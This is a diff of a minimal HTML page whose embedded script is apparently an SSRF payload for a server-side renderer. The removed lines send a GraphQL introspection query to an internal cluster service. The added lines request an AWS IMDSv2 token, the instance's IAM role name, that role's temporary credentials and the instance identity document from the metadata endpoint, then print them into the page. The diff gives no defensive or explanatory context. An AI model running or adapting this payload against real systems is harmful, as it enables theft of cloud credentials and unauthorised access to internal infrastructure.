@@ -1,7 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><title>x</title></head>
+<body>
 <script>
-fetch('https://digital-asset-manager-desired-service.crmmktg-branding-digitalassetmanager-prd.svc.cluster.local/graphql', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({query: 'mutationType fields{name args{name type} type{name}}'})
-}).then(r=>r.text()).then(t=>document.write(t)).catch(e=>document.write('err:'+e))
+try {
+  // Step 1: IMDSv2 token
+  var t = new XMLHttpRequest();
+  t.open('PUT', 'http://169.254.169.254/latest/api/token', false);
+  t.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
+  t.send('');
+  var tok = t.responseText;
+
+  // Step 2: Get IAM role name
+  var r = new XMLHttpRequest();
+  r.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', false);
+  r.setRequestHeader('X-aws-ec2-metadata-token', tok);
+  r.send('');
+  var role = r.responseText.trim();
+
+  // Step 3: Get credentials for the role
+  var c = new XMLHttpRequest();
+  c.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, false);
+  c.setRequestHeader('X-aws-ec2-metadata-token', tok);
+  c.send('');
+
+  // Also grab instance identity for account ID / region
+  var id = new XMLHttpRequest();
+  id.open('GET', 'http://169.254.169.254/latest/dynamic/instance-identity/document', false);
+  id.setRequestHeader('X-aws-ec2-metadata-token', tok);
+  id.send('');
+
+  document.body.innerHTML =
+    '<h2>Role: ' + role + '</h2>' +
+    '<pre id=creds>' + c.responseText + '</pre>' +
+    '<pre id=identity>' + id.responseText + '</pre>';
+
+} catch(e) {
+  document.body.innerHTML = 'err: ' + e;
+}
 </script>
+</body>
+</html>
